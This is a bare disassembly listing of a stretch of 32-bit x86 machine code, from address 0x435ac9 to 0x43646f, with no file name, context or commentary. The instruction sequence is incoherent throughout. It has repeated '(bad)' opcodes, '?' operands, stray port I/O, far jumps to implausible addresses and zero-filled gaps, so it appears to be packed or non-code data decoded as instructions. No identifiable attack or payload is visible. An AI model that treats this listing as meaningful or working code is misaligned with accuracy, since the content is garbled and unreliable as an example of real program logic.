  435ac9:	add    BYTE PTR [ebp+0x630cbe85],cl
  435acf:	div    dh
  435ad1:	add    DWORD PTR [edx-0xcdfc277],ebx
  435ad7:	or     DWORD PTR [ebx],edi
  435ad9:	and    cl,ah
  435adb:	scas   al,BYTE PTR es:[edi]
  435adc:	jp     0x435b5b
  435ade:	imul   eax,DWORD PTR [edx],0x39f30475
  435ae4:	cmp    ah,BYTE PTR [eax]
  435ae6:	xchg   ebx,eax
  435ae7:	div    dh
  435ae9:	add    ebx,esi
  435aeb:	xor    DWORD PTR [ebp+0x34],0x5d
  435aef:	inc    esi
  435af0:	push   esi
  435af1:	push   0x4d
  435af3:	das    
  435af4:	outs   dx,BYTE PTR ds:[esi]
  435af5:	and    al,0xd8
  435af7:	inc    ebx
  435af8:	and    al,0x56
  435afa:	jge    0x435abd
  435afc:	adc    ebx,DWORD PTR [eax+0x53]
  435aff:	inc    edx
  435b00:	add    BYTE PTR [ebx-0x3f7c432f],al
  435b06:	popa   
  435b07:	adc    DWORD PTR [esi-0x75],ecx
  435b0a:	pusha  
  435b0b:	mov    edx,0xbfd81fe2
  435b10:	cmc    
  435b11:	adc    ebp,0x2
  435b14:	pop    es
  435b15:	popf   
  435b16:	hlt    
  435b17:	jmp    0x435b98
  435b19:	mov    edi,0x4506cf81
  435b1e:	add    BYTE PTR [ecx],bh
  435b20:	lock gs add al,0x29
  435b24:	cmp    eax,0x41214424
  435b29:	and    al,0x44
  435b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435b2c:	jmp    0x435b7c
	...
  435b45:	add    BYTE PTR [eax],al
  435b47:	jmp    0xbca7:0xb07f03eb
  435b4e:	inc    esp
  435b4f:	ret    
  435b50:	lods   al,BYTE PTR ds:[esi]
  435b51:	repz mov dl,0x33
  435b54:	adc    BYTE PTR [edx+0x39],bl
  435b57:	aaa    
  435b58:	mov    eax,0xf8740a4a
  435b5d:	idiv   edi
  435b5f:	sub    BYTE PTR [eax-0x4fc876a4],ch
  435b65:	mov    esp,0x78ac9344
  435b6a:	inc    esp
  435b6b:	mov    esi,ebp
  435b6d:	sub    cl,cl
  435b6f:	mov    dh,0xa3
  435b71:	(bad)  
  435b72:	data16 mov ah,0xd3
  435b75:	sub    al,0x87
  435b77:	gs xor dh,ch
  435b7a:	mov    WORD PTR [eax],es
  435b7c:	lods   eax,DWORD PTR ds:[esi]
  435b7d:	ja     0x435bc0
  435b7f:	clc    
  435b80:	add    al,ah
  435b82:	aaa    
  435b83:	imul   DWORD PTR [edi+eax*1-0x2f]
  435b87:	(bad)  
  435b88:	mov    dl,0x71
  435b8a:	inc    ebp
  435b8b:	or     al,0x7a
  435b8d:	(bad)  
  435b8e:	push   ecx
  435b8f:	push   ds
  435b90:	dec    esi
  435b91:	(bad)  
  435b92:	out    0xf6,al
  435b94:	sbb    esp,eax
  435b96:	xor    DWORD PTR [edi+esi*2],0xfffffff4
  435b9a:	cli    
  435b9b:	mov    edx,0xf849779f
  435ba0:	ret    0x37b5
  435ba3:	or     al,0xa8
  435ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435ba6:	cli    
  435ba7:	adc    eax,DWORD PTR [ebx+eax*8]
  435baa:	rol    BYTE PTR [eax],0x0
	...
  435bc1:	add    BYTE PTR [eax],al
  435bc3:	add    BYTE PTR [eax-0x4f87f377],ah
  435bc9:	or     al,0x66
  435bcb:	xlat   BYTE PTR ds:[ebx]
  435bcc:	rcl    DWORD PTR [ecx-0x4e],cl
  435bcf:	jbe    0x435c19
  435bd1:	int    0x10
  435bd3:	xchg   ecx,eax
  435bd4:	jmp    0x435b8a
  435bd6:	call   0x933226eb
  435bdb:	call   FWORD PTR [ebp-0x8]
  435bde:	mov    ch,0xc4
  435be0:	jp     0x435bed
  435be2:	outs   dx,BYTE PTR ds:[esi]
  435be3:	push   ecx
  435be4:	cld    
  435be5:	and    DWORD PTR [ebx+ecx*1],0xb03b81ec
  435bec:	ror    DWORD PTR [ebp+0x1ef403e8],cl
  435bf2:	fst    QWORD PTR [eax-0x6ee75ed0]
  435bf8:	cmp    ch,cl
  435bfa:	sbb    bl,al
  435bfc:	add    BYTE PTR [ebp-0x2d],cl
  435bff:	inc    ebx
  435c00:	hlt    
  435c01:	xchg   DWORD PTR [eax+edx*1+0x1620c571],ebp
  435c08:	ret    
  435c09:	xchg   DWORD PTR [ecx-0x1aad3d04],ebp
  435c0f:	aas    
  435c10:	aas    
  435c11:	mov    BYTE PTR [eax-0x4fb0313d],dh
  435c17:	(bad)  
  435c18:	test   DWORD PTR [esi+ebx*2],0x15bb52c7
  435c1f:	imul   DWORD PTR [edx]
  435c21:	pop    esp
  435c22:	and    BYTE PTR [edx-0x10],ah
  435c25:	xor    al,BYTE PTR [edi+esi*8]
	...
  435c40:	add    BYTE PTR [esi],bh
  435c42:	sub    dl,0x2d
  435c45:	loopne 0x435bc8
  435c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435c48:	or     bh,ah
  435c4a:	push   esp
  435c4b:	inc    edx
  435c4c:	cmp    al,dl
  435c4e:	sbb    BYTE PTR [edx],bh
  435c50:	sbb    DWORD PTR [edx+ebx*1+0x33f7a900],edi
  435c57:	(bad)  
  435c58:	fnstsw WORD PTR [esp+esi*2+0x73]
  435c5c:	clc    
  435c5d:	mov    dl,0x33
  435c5f:	ret    
  435c60:	loope  0x435c64
  435c62:	dec    esi
  435c63:	add    al,0x95
  435c65:	adc    al,0x33
  435c67:	enter  0x570e,0x5c
  435c6b:	mov    esi,0xbe8bf7ed
  435c70:	adc    bl,BYTE PTR [edi+0x47b0cde2]
  435c76:	or     DWORD PTR [esi+eax*8+0x1d],esi
  435c7a:	out    dx,al
  435c7b:	dec    edi
  435c7c:	or     DWORD PTR ds:0x28206207,ecx
  435c82:	stc    
  435c83:	jae    0x435c77
  435c85:	sar    DWORD PTR [ecx+edx*2+0x6f177069],0xf7
  435c8d:	push   es
  435c8e:	ja     0x435c80
  435c90:	mov    edi,0xef53fbb8
  435c95:	out    dx,eax
  435c96:	cmp    al,dh
  435c98:	imul   edx,DWORD PTR [eax+0x17],0x4db77c0b
  435c9f:	mov    edi,0x5172b7db
  435ca4:	add    BYTE PTR ds:[eax],al
	...
  435cbb:	add    BYTE PTR [eax],al
  435cbd:	add    BYTE PTR [ebx-0x5f],ch
  435cc0:	gs cmc 
  435cc2:	(bad)  
  435cc3:	retf   
  435cc4:	es jns 0x435c9d
  435cc7:	mov    dl,BYTE PTR [ebx]
  435cc9:	call   0xddcb6037
  435cce:	in     eax,dx
  435ccf:	inc    esp
  435cd0:	dec    ebx
  435cd1:	hlt    
  435cd2:	mov    ecx,DWORD PTR [esi+0x5a]
  435cd5:	sub    ch,BYTE PTR [ebx+ecx*4+0xac72eb]
  435cdc:	jg     0x435d23
  435cde:	dec    edi
  435cdf:	adc    BYTE PTR [ecx+esi*1+0x5f],0xd8
  435ce4:	cli    
  435ce5:	add    BYTE PTR [edx+0x114581c6],dh
  435ceb:	or     BYTE PTR [ebx+0x8],0x90
  435cef:	dec    esp
  435cf0:	in     al,dx
  435cf1:	call   0x3923d0
  435cf6:	sbb    ecx,DWORD PTR [di-0xebb]
  435cfb:	push   edi
  435cfc:	lea    eax,[ebp-0x3b]
  435cff:	push   edi
  435d00:	not    DWORD PTR ds:0x400ca5
  435d06:	pop    esi
  435d07:	retf   0xc906
  435d0a:	paddd  mm7,mm7
  435d0d:	push   esp
  435d0e:	push   esi
  435d0f:	bound  edi,QWORD PTR [edi-0x14]
  435d12:	loope  0x435d1a
  435d14:	add    BYTE PTR [eax],al
  435d16:	or     ecx,DWORD PTR [ebp+ecx*4-0x4b]
  435d1a:	fld    st(4)
  435d1c:	cmc    
  435d1d:	push   DWORD PTR [ebp+0xfe7dd0]
	...
  435d3b:	ret    0xbab8
  435d3e:	inc    eax
  435d3f:	and    dl,bh
  435d41:	repz call 0x436560
  435d47:	adc    BYTE PTR [edx-0x3b9d01fe],cl
  435d4d:	dec    edx
  435d4e:	dec    DWORD PTR [eax-0x72bff39a]
  435d54:	or     eax,eax
  435d56:	push   eax
  435d57:	adc    BYTE PTR [edx-0x3b7d01fe],cl
  435d5d:	dec    edx
  435d5e:	mov    ebx,DWORD PTR [ebx+0x4d03d961]
  435d64:	push   es
  435d65:	mov    bh,0xdc
  435d67:	jnp    0x435db1
  435d69:	add    BYTE PTR [ebp+ebx*4+0x4d6a3bed],al
  435d70:	add    DWORD PTR [ebx-0xa3c5c7c],0x50
  435d77:	hlt    
  435d78:	es (bad) 
  435d7a:	out    0x3e,eax
  435d7c:	lahf   
  435d7d:	(bad)  
  435d7e:	push   DWORD PTR [eax-0x24]
  435d81:	aaa    
  435d82:	sub    BYTE PTR [edi-0x16],ch
  435d85:	stos   DWORD PTR es:[edi],eax
  435d86:	pusha  
  435d87:	lock fwait
  435d89:	inc    BYTE PTR [ebx-0x78e687cc]
  435d8f:	xor    dl,BYTE PTR [ecx*4+0x759c03fe]
  435d96:	jmp    0x8d41f990
  435d9b:	jns    0x435d44
  435d9d:	sar    dl,0x0
	...
  435db8:	jmp    0x435d9b
  435dba:	add    eax,DWORD PTR [eax]
  435dbc:	xor    al,0x75
  435dbe:	xor    ecx,edi
  435dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435dc1:	pushf  
  435dc2:	stos   DWORD PTR es:[edi],eax
  435dc3:	xor    eax,0x2cd85e
  435dc8:	and    ebp,DWORD PTR [ebx-0x2415afef]
  435dce:	add    esp,DWORD PTR [esi-0x1c]
  435dd1:	sub    BYTE PTR [edx-0x403d4d7d],al
  435dd7:	dec    edi
  435dd8:	inc    ebx
  435dd9:	retf   
  435dda:	adc    DWORD PTR [edx+ecx*1-0x24],ecx
  435dde:	add    edi,DWORD PTR [edi-0x50]
  435de1:	ror    DWORD PTR [ecx+0x4fc38844],cl
  435de7:	dec    DWORD PTR [ebx-0xa168a65]
  435ded:	fwait
  435dee:	dec    BYTE PTR [ecx+esi*2+0x73fac09f]
  435df5:	imul   edi,esi,0x32f4b4ff
  435dfb:	stc    
  435dfc:	es pop esp
  435dfe:	pop    edi
  435dff:	pop    edx
  435e00:	sub    eax,0x443c7e5e
  435e05:	add    BYTE PTR [ebx+0x0],0xf4
  435e09:	add    al,0xdc
  435e0b:	mul    BYTE PTR [ebp-0x51e0f8e]
  435e11:	add    al,0xbb
  435e13:	ror    BYTE PTR [eax],0xd
  435e16:	test   DWORD PTR [ebx-0xc],0xb40384
	...
  435e35:	inc    eax
  435e36:	inc    ebp
  435e37:	jmp    0x415cff3f
  435e3c:	sbb    eax,0x8729b10f
  435e41:	dec    ebx
  435e42:	cmp    bl,dh
  435e44:	test   al,bl
  435e46:	mov    eax,0x4f4443b
  435e4b:	sub    eax,DWORD PTR [esi]
  435e4d:	in     al,0xd2
  435e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435e50:	add    esi,ebp
  435e52:	push   esi
  435e53:	add    dl,BYTE PTR [esi]
  435e55:	add    BYTE PTR [ebx],dl
  435e57:	test   eax,0x146d3e03
  435e5c:	fst    DWORD PTR [edx]
  435e5e:	add    eax,0x9ce02d26
  435e63:	fwait
  435e64:	mov    edi,0xbf38b0be
  435e69:	inc    edi
  435e6a:	jmp    0x4d4c1d53
  435e6f:	repz inc ebx
  435e71:	hlt    
  435e72:	sub    DWORD PTR [eax+edx*1-0x3c223259],0xffffffdb
  435e7a:	ret    0x3ec
  435e7d:	inc    ebx
  435e7e:	jl     0x435e4b
  435e80:	dec    edi
  435e81:	out    0x44,al
  435e83:	jmp    0x39da27a
  435e88:	lea    esi,ds:0xb58d0ae3
  435e8e:	idiv   dh
  435e90:	pop    ss
  435e91:	jns    0x435edb
  435e93:	call   0xf18acfeb
  435e98:	repnz add BYTE PTR [eax],al
	...
  435eaf:	add    BYTE PTR [eax],al
  435eb1:	add    BYTE PTR [eax+0x55],cl
  435eb4:	add    BYTE PTR [eax+0x62],ah
  435eb7:	jge    0x435f22
  435eb9:	in     eax,0x8a
  435ebb:	mov    edi,0x26e42d7e
  435ec0:	add    al,0xc7
  435ec2:	cmp    BYTE PTR [ebx],bl
  435ec4:	sbb    ebp,ebx
  435ec6:	add    eax,DWORD PTR [edx-0x7e380bbe]
  435ecc:	inc    ecx
  435ecd:	in     eax,0xc7
  435ecf:	stos   DWORD PTR es:[edi],eax
  435ed0:	into   
  435ed1:	push   edx
  435ed2:	out    dx,eax
  435ed3:	add    DWORD PTR [ecx-0x2b],0xd4fb54ac
  435eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435edb:	adc    al,BYTE PTR [eax-0x17]
  435ede:	fld    DWORD PTR [edi-0x3b88ffbe]
  435ee4:	or     ecx,DWORD PTR [edi+0x17204580]
  435eea:	repz scas al,BYTE PTR es:[edi]
  435eec:	outs   dx,BYTE PTR ds:[esi]
  435eed:	loop   0x435f08
  435eef:	out    dx,al
  435ef0:	push   0xffffffd2
  435ef2:	and    ebx,DWORD PTR [edx]
  435ef4:	fldenvw [edx+eax*2+0x17]
  435ef9:	cdq    
  435efa:	fs inc ebp
  435efc:	and    al,0x39
  435efe:	cmp    DWORD PTR [esi-0x17cd8d9f],0x7e
  435f05:	lods   eax,DWORD PTR ds:[esi]
  435f06:	add    ebp,DWORD PTR [eax-0x7dffbcf3]
  435f0c:	inc    ecx
  435f0d:	or     eax,0xd4fb553d
  435f12:	inc    edi
  435f13:	adc    eax,DWORD PTR [eax-0x17]
	...
  435f2e:	add    BYTE PTR [esi-0x3d],dh
  435f31:	or     edi,edx
  435f33:	mov    bh,0x50
  435f35:	bound  esi,QWORD PTR [eax+0x39]
  435f38:	stc    
  435f39:	push   esi
  435f3a:	stos   BYTE PTR es:[edi],al
  435f3b:	es pop edx
  435f3d:	xchg   esp,eax
  435f3f:	ret    
  435f40:	adc    al,BYTE PTR [eax-0x17]
  435f43:	sbb    eax,0x12008d19
  435f48:	add    DWORD PTR [eax-0x73],edx
  435f4b:	adc    ecx,DWORD PTR [edx]
  435f4d:	push   eax
  435f4e:	(bad)  
  435f4f:	arpl   WORD PTR [ebx],ax
  435f51:	not    ebp
  435f53:	(bad)  
  435f54:	in     al,0x4f
  435f56:	push   ss
  435f57:	lea    eax,[ebx]
  435f59:	jnp    0x435f1f
  435f5b:	dec    ecx
  435f5c:	jmp    0x940dedb
  435f61:	bound  eax,QWORD PTR [ecx+eax*2]
  435f64:	dec    DWORD PTR [edi+eax*2+0x468d5319]
  435f6b:	inc    eax
  435f6c:	push   ebx
  435f6d:	not    ebp
  435f6f:	mov    dh,0xfb
  435f71:	mov    WORD PTR [esi+0x20],es
  435f74:	(bad)  
  435f76:	dec    edi
  435f77:	fcmovbe st,st(2)
  435f79:	pusha  
  435f7a:	mov    edx,DWORD PTR [edx-0x5d]
  435f7d:	jns    0x435f43
  435f7f:	fld1   
  435f81:	mov    BYTE PTR [esi-0x1c],al
  435f84:	call   0x2e4df03
  435f89:	bound  edx,QWORD PTR [eax]
  435f8b:	popa   
  435f8c:	sbb    BYTE PTR [ebp-0x72ad3eb9],cl
  435f92:	inc    esi
	...
  435fab:	add    BYTE PTR [esi+0x33d5f752],ah
  435fb1:	jl     0x435ff0
  435fb3:	xor    al,0x4e
  435fb5:	mov    ebp,0x49b8006
  435fba:	jecxz  0x435fc9
  435fbc:	dec    eax
  435fbd:	inc    edi
  435fbe:	adc    ebp,DWORD PTR [edx-0x73]
  435fc1:	push   edx
  435fc2:	not    ebx
  435fc4:	push   cs
  435fc5:	mov    ebp,0x4e5d3306
  435fca:	pop    esi
  435fcb:	mov    ebx,edx
  435fcd:	fwait
  435fce:	push   ecx
  435fcf:	ret    
  435fd0:	mov    esi,0xe7386256
  435fd5:	or     BYTE PTR [edi-0x75],cl
  435fd8:	hlt    
  435fd9:	mov    edi,DWORD PTR [esp+edx*1+0x3eb5c4]
  435fe0:	outs   dx,DWORD PTR ds:[esi]
  435fe1:	ficom  WORD PTR [ebx]
  435fe3:	xchg   ecx,edi
  435fe5:	fist   WORD PTR [ecx]
  435fe7:	inc    eax
  435fe8:	hlt    
  435fe9:	fcom   QWORD PTR cs:[esi]
  435fec:	xor    al,0x51
  435fee:	dec    edx
  435fef:	adc    dl,BYTE PTR [edi]
  435ff1:	fld    QWORD PTR [eax+0x12d1dcbf]
  435ff7:	push   eax
  435ff8:	sbb    DWORD PTR [edi+0x6],0x8aeb2b50
  435fff:	inc    ecx
  436000:	lods   al,BYTE PTR ds:[esi]
  436001:	mov    dh,0x73
  436003:	das    
  436004:	ja     0x435fee
  436006:	sbb    esi,ebx
  436008:	xor    dl,bl
  43600a:	mov    ah,0x1e
  43600c:	add    al,0xcf
  43600e:	jae    0x436011
	...
  436028:	add    BYTE PTR [ebx+esi*2+0x14772932],ch
  43602f:	adc    esi,DWORD PTR [ebp+0x3a]
  436032:	or     BYTE PTR [esi],0x8d
  436035:	xor    ah,BYTE PTR [esi+ecx*2+0x4ec03b8d]
  43603c:	sti    
  43603d:	mov    DWORD PTR [ebp-0x5909be79],0x85f74974
  436047:	mov    ebp,0xc31aecdf
  43604c:	or     edx,DWORD PTR [edx-0x4d]
  43604f:	mov    ebp,0xf7de7d61
  436054:	out    0xd6,al
  436056:	inc    ecx
  436057:	or     BYTE PTR [ebp-0x72b15fc6],cl
  43605d:	xor    edx,eax
  43605f:	dec    esi
  436060:	sti    
  436061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436062:	cmp    eax,0xcef64189
  436067:	je     0x4360b2
  436069:	test   DWORD PTR [ebx+ecx*1],0x65fc9bc3
  436070:	(bad)  
  436071:	jmp    DWORD PTR [esi]
  436073:	faddp  st(2),st
  436075:	aad    0x7b
  436077:	and    esp,esp
  436079:	mov    ebp,0xf429a649
  43607e:	sbb    ch,cl
  436080:	(bad)  
  436081:	cmc    
  436082:	test   BYTE PTR [ebx+eax*2-0xc],ah
  436086:	lods   eax,DWORD PTR ds:[esi]
  436087:	ror    DWORD PTR [edi-0x7516bb1b],cl
	...
  4360a5:	add    BYTE PTR [ebp+0x72c56e08],dh
  4360ab:	push   esi
  4360ac:	pop    esi
  4360ad:	mov    dl,0x13
  4360af:	adc    ecx,ebp
  4360b1:	add    esi,esp
  4360b3:	mov    dh,0xac
  4360b5:	out    0xf3,eax
  4360b7:	add    esi,DWORD PTR [ebp-0x1a6359fb]
  4360bd:	(bad)  
  4360be:	push   cs
  4360bf:	lods   eax,DWORD PTR ds:[esi]
  4360c0:	pop    ebp
  4360c1:	lds    ebx,FWORD PTR [ebp-0x59fc133e]
  4360c7:	jns    0x4360e0
  4360c9:	mov    BYTE PTR ds:0x74052a01,dh
  4360cf:	jns    0x436079
  4360d1:	add    edi,DWORD PTR [ecx-0x3b]
  4360d4:	jl     0x4360dc
  4360d6:	pop    ebx
  4360d7:	lods   eax,DWORD PTR ds:[esi]
  4360d8:	out    0x36,eax
  4360da:	cli    
  4360db:	stos   DWORD PTR es:[edi],eax
  4360dc:	fist   DWORD PTR [edi-0x7f16bb1b]
  4360e2:	sub    eax,0x7b5ae201
  4360e7:	sub    BYTE PTR [eax],0x0
  4360ea:	jns    0x4360b1
  4360ec:	pop    esp
  4360ed:	or     ebp,DWORD PTR [ebx]
  4360ef:	lods   eax,DWORD PTR ds:[esi]
  4360f0:	out    0x2f,eax
  4360f2:	cli    
  4360f3:	jmp    0x853865e2
  4360f8:	xor    al,0x7
  4360fa:	jecxz  0x4360c0
  4360fc:	jmp    FWORD PTR [ecx-0x55c0937d]
  436102:	and    eax,0x7338eb84
  436107:	and    esp,edi
  436109:	jmp    0x43610e
	...
  436122:	add    BYTE PTR [ecx+eax*2-0x4],bh
  436126:	cmp    DWORD PTR [edi-0x6fef3cf],ebp
  43612c:	inc    eax
  43612d:	add    cl,ch
  43612f:	or     DWORD PTR ds:0xaffff4fb,eax
  436135:	adc    al,0x51
  436137:	out    0x44,al
  436139:	add    BYTE PTR [eax+edi*1+0x34],ah
  43613d:	add    esi,DWORD PTR [edx-0x4b]
  436140:	test   al,0x84
  436142:	sub    ebp,esp
  436144:	stos   BYTE PTR es:[edi],al
  436145:	sub    eax,0x76a3929
  43614a:	jmp    0xf1a91e79
  43614f:	push   0xffffffc5
  436151:	push   ebp
  436152:	xchg   ecx,eax
  436153:	stc    
  436154:	xor    BYTE PTR [ecx],cl
  436156:	sbb    BYTE PTR [eax-0xf],bl
  436159:	pop    ds
  43615a:	push   0xffffff80
  43615c:	cwde   
  43615d:	out    0xeb,al
  43615f:	and    BYTE PTR [ebp+eax*2+0x37c9d94],ah
  436166:	mov    al,fs:0x38e93ed5
  43616c:	xchg   al,bh
  43616e:	jmp    0x7b436663
  436173:	mov    al,0x5b
  436175:	add    BYTE PTR [edx],ch
  436177:	jae    0x436166
  436179:	push   DWORD PTR [ebx-0x1e]
  43617c:	sbb    al,0x40
  43617e:	jmp    0xe8a9167a
  436183:	loope  0x436189
  436185:	jmpw   0x6189
	...
  43619d:	add    BYTE PTR [eax],al
  43619f:	add    BYTE PTR [ebp-0x50],al
  4361a2:	adc    al,0x3d
  4361a4:	or     BYTE PTR [ebp+0x0],al
  4361a7:	add    BYTE PTR [eax],cl
  4361a9:	enter  0x573,0xfc
  4361ad:	push   es
  4361ae:	sub    al,al
  4361b0:	pop    esi
  4361b1:	aaa    
  4361b2:	add    bl,al
  4361b4:	adc    al,0x46
  4361b6:	or     BYTE PTR [eax-0x3b],cl
  4361b9:	hlt    
  4361ba:	or     BYTE PTR [ebx+0x667b073b],al
  4361c0:	pop    ecx
  4361c1:	pop    es
  4361c2:	jecxz  0x436205
  4361c4:	into   
  4361c5:	std    
  4361c6:	test   BYTE PTR [eax+0x43dc3730],0x5d
  4361cd:	pop    es
  4361ce:	jne    0x436205
  4361d0:	jmp    0x4f01:0xede032f
  4361d7:	(bad)  
  4361d8:	cmp    BYTE PTR [edi],cl
  4361da:	or     al,BYTE PTR [eax+0x1d]
  4361dd:	xchg   DWORD PTR [ebx],edi
  4361df:	mov    al,0xe0
  4361e1:	inc    edx
  4361e2:	add    BYTE PTR [eax],al
  4361e4:	dec    eax
  4361e5:	push   ss
  4361e6:	call   0xf5b21465
  4361eb:	test   ch,bl
  4361ed:	fild   DWORD PTR ds:0xdc34f883
  4361f3:	inc    ebx
  4361f4:	or     eax,0x9d05be07
  4361f9:	int3   
  4361fa:	cmp    DWORD PTR [eax],eax
  4361fc:	fcom   QWORD PTR [edi-0x9]
  4361ff:	adc    eax,0x4010e1
	...
  43621c:	add    BYTE PTR [edx+0x7bc3c07b],dl
  436222:	jnp    0x43620e
  436224:	mov    ebx,DWORD PTR [ebx+0x494847fe]
  43622a:	or     eax,0x85d94683
  43622f:	mov    edx,0xf756ca74
  436234:	adc    eax,0x4016ad
  436239:	hlt    
  43623a:	es out dx,al
  43623c:	test   BYTE PTR [edx-0xb99f8b0],ch
  436242:	or     DWORD PTR [ecx+0x3ecc0414],edi
  436248:	add    BYTE PTR [edx],ch
  43624a:	pop    edi
  43624b:	dec    edx
  43624c:	xchg   DWORD PTR [eax+0x6f52550d],edx
  436252:	mov    WORD PTR [ecx+eax*2+0x534bf3fc],cs
  436259:	loopne 0x43624b
  43625b:	stos   DWORD PTR es:[edi],eax
  43625c:	inc    esi
  43625d:	arpl   WORD PTR [ebx-0x48],di
  436260:	xor    DWORD PTR [ecx+ebp*4],0xfffffffa
  436264:	sub    eax,0x8d359734
  436269:	retf   0xf397
  43626c:	(bad)  
  43626d:	std    
  43626e:	mov    edx,0x5a6f3029
  436273:	push   es
  436274:	daa    
  436275:	aaa    
  436276:	rol    BYTE PTR [edx],1
  436278:	dec    eax
  436279:	mov    eax,ds:0x2044bfab
  43627e:	mov    al,ds:0xff7e
	...
  436297:	add    BYTE PTR [eax],al
  436299:	add    BYTE PTR [ebx],bl
  43629b:	push   edi
  43629c:	add    ebx,eax
  43629e:	mov    ecx,0xf48004e7
  4362a3:	fwait
  4362a4:	dec    edi
  4362a5:	dec    edi
  4362a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4362a7:	fisubr DWORD PTR [edx]
  4362a9:	cld    
  4362aa:	sti    
  4362ab:	leave  
  4362ac:	mov    bh,0x14
  4362ae:	push   0x71003eac
  4362b3:	fld    TBYTE PTR [edx]
  4362b5:	add    al,0x6d
  4362b7:	call   0xc2b:0x347beab
  4362be:	shl    DWORD PTR [eax],cl
  4362c0:	pop    es
  4362c1:	sti    
  4362c2:	add    esi,DWORD PTR [ebx+0x5be47809]
  4362c8:	inc    BYTE PTR [edi-0x3d]
  4362cb:	add    al,0xc1
  4362cd:	sbb    al,0xb4
  4362cf:	inc    esp
  4362d0:	into   
  4362d1:	jmp    0xdd596548
  4362d6:	sar    BYTE PTR [ebx+0x32e8570f],cl
  4362dc:	loop   0x43626a
  4362de:	sub    ch,bh
  4362e0:	jmp    0xf6574a56
  4362e5:	shl    DWORD PTR [esi+eiz*4-0x57],cl
  4362e9:	add    esi,esp
  4362eb:	add    al,0xa8
  4362ed:	stos   DWORD PTR es:[edi],eax
  4362ee:	sti    
  4362ef:	cmc    
  4362f0:	in     al,0x8e
  4362f2:	pop    ebx
  4362f3:	shl    BYTE PTR ds:0x1bedb504,cl
  4362f9:	or     dl,cl
  4362fb:	mov    ds:0x16f,eax
	...
  436314:	add    BYTE PTR [eax],al
  436316:	add    BYTE PTR [ebx+eax*1-0x445ca5e6],al
  43631d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43631e:	or     esi,esp
  436320:	dec    edi
  436321:	pop    esi
  436322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436324:	jge    0x4362de
  436326:	or     eax,DWORD PTR [ecx-0x39b5a5c2]
  43632c:	xor    BYTE PTR [ebp-0x2afbe67c],ch
  436332:	pop    es
  436333:	mov    dl,0x2f
  436335:	fld    st(0)
  436337:	mov    eax,0xf403d4a8
  43633c:	add    al,0x3e
  43633e:	add    BYTE PTR [edi],dh
  436340:	aas    
  436341:	sub    eax,0xe904f413
  436346:	mov    WORD PTR [ebx],?
  436348:	add    DWORD PTR [esi+0x2e],ebp
  43634b:	call   0xfe728bd2
  436350:	sbb    ch,cl
  436352:	xchg   BYTE PTR [eax],ch
  436354:	test   eax,0x35a5097
  436359:	cdq    
  43635a:	mov    eax,0xd9001ce0
  43635f:	aaa    
  436360:	add    eax,0x31f5f17f
  436365:	add    eax,0x73a8e520
  43636a:	stc    
  43636b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43636c:	push   0x68a5e5e6
  436371:	out    0xe1,al
  436373:	outs   dx,BYTE PTR ds:[esi]
  436374:	test   al,0xf1
  436376:	cdq    
  436377:	add    DWORD PTR [ebx],0xe8b0
	...
  436391:	add    BYTE PTR [eax],al
  436393:	add    BYTE PTR [ecx],ah
  436395:	mov    esi,0x9c6f1cbe
  43639a:	jle    0x436359
  43639c:	in     al,dx
  43639d:	aaa    
  43639e:	push   edx
  43639f:	je     0x4363c6
  4363a1:	mov    cl,0xe7
  4363a3:	adc    eax,0x96faaba2
  4363a8:	and    eax,0xa3a786f9
  4363ad:	xor    DWORD PTR [eax],ecx
  4363af:	xchg   ecx,eax
  4363b0:	xchg   esp,eax
  4363b1:	scas   al,BYTE PTR es:[edi]
  4363b2:	cli    
  4363b3:	jle    0x436429
  4363b5:	push   0xc66ee673
  4363ba:	out    0xf2,eax
  4363bc:	sub    BYTE PTR [ebx+0x34386dfa],0x4
  4363c3:	call   0x793f:0x1afd9ff1
  4363ca:	inc    esp
  4363cb:	push   ebp
  4363cc:	dec    eax
  4363cd:	mov    ?,ecx
  4363cf:	inc    esi
  4363d0:	dec    ebx
  4363d1:	dec    esi
  4363d2:	xchg   BYTE PTR [edx],ch
  4363d4:	scas   eax,DWORD PTR es:[edi]
  4363d5:	mov    ebp,0x51f7e1bd
  4363da:	xchg   DWORD PTR ds:0xeb9f9c71,edi
  4363e0:	test   DWORD PTR [edi+ecx*2],0xb2fac972
  4363e7:	stos   BYTE PTR es:[edi],al
  4363e8:	jecxz  0x43643f
  4363ea:	push   ebx
  4363eb:	xchg   DWORD PTR [edi+eiz*2+0x74],esi
  4363ef:	add    dl,ah
  4363f1:	sub    edx,DWORD PTR [eax+eax*1+0x36e303dd]
	...
  436410:	add    BYTE PTR [esi-0x14],cl
  436413:	pop    es
  436414:	inc    DWORD PTR [ecx-0x4c]
  436417:	mov    edi,DWORD PTR [ebp-0xa91c3]
  43641d:	vxorpd xmm7,xmm3,xmm7
  436421:	retf   0x696e
  436424:	or     BYTE PTR [esi],dl
  436426:	addr16 dec edx
  436428:	lea    esp,[eax]
  43642a:	sbb    al,0xf9
  43642c:	dec    DWORD PTR [edx-0x23]
  43642f:	dec    DWORD PTR [edi+0x4]
  436432:	push   ecx
  436433:	add    DWORD PTR [eax],eax
  436435:	lea    ebx,[ebx+0x72]
  436438:	fwait
  436439:	call   0xba84:0x6dc4796e
  436440:	je     0x43649f
  436442:	sub    eax,DWORD PTR [esi-0x72fcb300]
  436448:	mov    ebp,0xfff571a5
  43644d:	gs mov cl,0x52
  436450:	dec    edx
  436452:	pop    ebx
  436453:	sbb    bl,BYTE PTR [edx-0x36]
  436456:	outs   dx,BYTE PTR ds:[esi]
  436457:	dec    edx
  436458:	call   0x3a699f
  43645d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43645e:	hlt    
  43645f:	or     ecx,DWORD PTR [ecx+0xfba8413]
  436465:	xchg   ecx,eax
  436466:	mov    ?,edx
  436468:	call   FWORD PTR ds:0xe0c4378
  43646e:	ret    
  43646f:	pusha  
